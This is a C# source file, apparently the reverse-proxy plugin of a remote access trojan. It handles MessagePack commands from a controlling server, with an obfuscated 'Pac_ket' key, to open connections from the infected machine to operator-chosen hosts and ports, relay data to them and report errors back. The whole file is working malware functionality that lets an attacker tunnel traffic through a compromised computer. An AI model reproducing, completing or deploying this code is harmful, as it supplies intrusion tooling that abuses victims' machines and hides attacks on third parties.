using System;
using System.Linq;
using MessagePackLib.MessagePack;
using ReverseProxy.Handler;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            var unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
            {
                case "ReverseProxy":
                {
                    switch (unpack_msgpack.ForcePathObject("Option").AsString)
                    {
                        case "ReverseProxyConnect":
                        {
                            var ConnectionId = 0;
                            var Port = 0;
                            var Target = unpack_msgpack.ForcePathObject("Target").AsString;
                            try
                            {
                                ConnectionId = int.Parse(unpack_msgpack.ForcePathObject("ConnectionId").AsString);
                            }
                            catch (Exception ex)
                            {
                                Error(ex.Message);
                            }

                            try
                            {
                                Port = int.Parse(unpack_msgpack.ForcePathObject("Port").AsString);
                            }
                            catch (Exception ex)
                            {
                                Error(ex.Message);
                            }

                            lock (HandleReverseProxy._proxyClientsLock)
                            {
                                HandleReverseProxy._proxyClients.Add(new HandleReverseProxy(ConnectionId, Target,
                                    Port));
                            }

                            break;
                        }

                        case "ReverseProxyData":
                        {
                            var ConnectionId = 0;
                            try
                            {
                                ConnectionId = int.Parse(unpack_msgpack.ForcePathObject("ConnectionId").AsString);
                            }
                            catch (Exception ex)
                            {
                                Error(ex.Message);
                            }

                            var Data = unpack_msgpack.ForcePathObject("Data").GetAsBytes();
                            HandleReverseProxy handleReverseProxy;
                            try
                            {
                                lock (HandleReverseProxy._proxyClientsLock)
                                {
                                    handleReverseProxy =
                                        HandleReverseProxy._proxyClients.FirstOrDefault(t =>
                                            t.ConnectionId == ConnectionId);
                                }

                                handleReverseProxy?.SendToTargetServer(Data);
                            }
                            catch
                            {
                                lock (HandleReverseProxy._proxyClientsLock)
                                {
                                    handleReverseProxy =
                                        HandleReverseProxy._proxyClients.FirstOrDefault(t =>
                                            t.ConnectionId == ConnectionId);
                                }

                                handleReverseProxy.Disconnect();
                            }

                            break;
                        }

                        case "ReverseProxyDisconnect":
                        {
                            var ConnectionId = 0;
                            try
                            {
                                ConnectionId = int.Parse(unpack_msgpack.ForcePathObject("ConnectionId").AsString);
                            }
                            catch (Exception ex)
                            {
                                Error(ex.Message);
                            }

                            HandleReverseProxy socksClient;
                            lock (HandleReverseProxy._proxyClientsLock)
                            {
                                socksClient =
                                    HandleReverseProxy._proxyClients.FirstOrDefault(t =>
                                        t.ConnectionId == ConnectionId);
                            }

                            socksClient?.Disconnect();
                            break;
                        }
                    }

                    break;
                }
            }
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}